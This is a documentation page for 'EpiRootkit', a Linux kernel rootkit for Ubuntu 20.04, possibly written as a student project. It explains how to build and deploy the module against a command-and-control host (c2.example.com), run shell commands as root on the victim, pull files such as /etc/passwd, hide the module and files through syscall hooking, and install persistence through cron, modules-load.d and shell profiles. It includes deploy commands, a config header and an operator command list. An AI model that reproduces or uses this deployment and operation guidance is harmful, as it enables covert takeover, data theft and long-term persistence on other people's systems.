---
title: "EpiRootkit Overview"
description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0"
icon: "shield"
date: "2025-05-25T16:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 501
---

# EpiRootkit

Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).

## Features

- **C2 Communication**: TCP connection with domain support
- **DNS Resolution**: Kernel-space domain name resolution
- **Remote Commands**: Execute shell commands with output capture
- **File Transfer**: Upload/download files between C2 and victim
- **Authentication**: SHA-512 password verification with rate limiting
- **Stealth**: Hide module from `lsmod` and files from directory listings
- **Persistence**: Multiple mechanisms to survive reboots

## Quick Demo

```bash
# 1. Build and deploy
cd rootkit && make
sudo ./deploy_rootkit.sh address=c2.example.com port=443

# 2. Start C2 server  
cd attacking_program && pnpm start

# 3. Use rootkit
auth Client-1 password
# SUCCESS: Authentication successful

exec Client-1 whoami
# Exit code: 0
# Output: root

status Client-1
# EpiRootkit Status: Version 1.0.0, Module Hidden: YES
```

## DNS Resolution Feature

**Real rootkit behavior with domain-based C2:**

```bash
# Deploy with domain instead of IP
sudo ./deploy_rootkit.sh address=jules-c2.example.com port=443

# Kernel messages show DNS resolution
dmesg | tail -5
# [2025-05-25 16:13:09] Resolving domain: jules-c2.example.com
# [2025-05-25 16:13:09] Resolved to 203.0.113.42
# [2025-05-25 16:13:09] Connected to C2 server
```

**Benefits:**
- **Dynamic infrastructure**: Easy C2 server changes
- **Load balancing**: DNS can rotate between servers  
- **Stealth**: Less suspicious than hardcoded IPs
- **Resilience**: Backup domains for takedown resistance

## Core Components

### Network Layer
- **Connection Management**: Persistent TCP with auto-reconnect
- **DNS Resolution**: Kernel-space resolver using 8.8.8.8
- **Keepalive System**: 60-second ping/pong monitoring
- **Socket Handling**: Low-level network operations

### Command System
- **Authentication**: SHA-512 password verification
- **Execution**: Shell commands with output capture
- **File Operations**: Upload/download with Base64 encoding
- **Status Reporting**: System and rootkit information
- **Persistence Control**: Install/remove boot mechanisms
- **Stealth Control**: Toggle module/file hiding

### Stealth Features
- **Module Hiding**: Remove from kernel module list
- **File Hiding**: Hide files with specific prefixes
- **Syscall Hooking**: kretprobe on `ksys_getdents64`

### Persistence Mechanisms
- **modules-load.d**: Systemd automatic loading
- **Cron Jobs**: Scheduled checking (every 5 minutes)
- **Shell Profiles**: Login-triggered loading

## Architecture

### Two-Stage Deployment
```
Deployment Script  →  EpiRootkit Module  →  Target System
(Stage 1: Loader)     (Stage 2: Runtime)    (Linux Kernel)
```

### Communication Flow
```
C2 Server  ←→  Network/DNS  ←→  EpiRootkit  ←→  Linux Kernel
(Node.js)      (TCP/UDP)       (Module)        (System Calls)
```

## Configuration

Edit `rootkit/core/config.h`:
```c
#define C2_SERVER_ADDRESS "c2.example.com"  // Domain or IP
#define C2_SERVER_PORT 4444
#define ENABLE_PERSISTENCE 1       // Auto-install persistence
#define ENABLE_MODULE_HIDING 1     // Hide by default
#define ENABLE_FILE_HIDING 1       // Hide files with prefixes
```

## Technical Stack

- **Target**: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64
- **Language**: C (kernel module) + Node.js (C2 server)
- **APIs**: ftrace, kretprobe, VFS, crypto API, UDP sockets
- **Network**: TCP (C2) + UDP (DNS resolution)
- **Authentication**: SHA-512 with rate limiting (5 attempts/60s)

## Command Examples

```bash
# Client management
ls                    # List connected clients
auth Client-1 password  # Authenticate

# System reconnaissance  
exec Client-1 whoami
exec Client-1 uname -a
exec Client-1 ps aux

# File operations
upload Client-1 ./tool.sh /tmp/
download Client-1 /etc/passwd

# Stealth operations
hide_module Client-1     # Hide from lsmod
hide_files Client-1      # Enable file hiding

# Persistence
persist Client-1 install  # Install all mechanisms
```

## Documentation

- **[Deployment](./deployment.md)**: Build and load with domain support
- **[Connection](./connection-authentication.md)**: Network communication
- **[Commands](./features/command-execution.md)**: Remote command execution
- **[File Transfer](./features/file-transfer.md)**: Upload/download files
- **[Stealth](./features/hiding.md)**: Module and file hiding
- **[Persistence](./features/persistence.md)**: Boot survival mechanisms


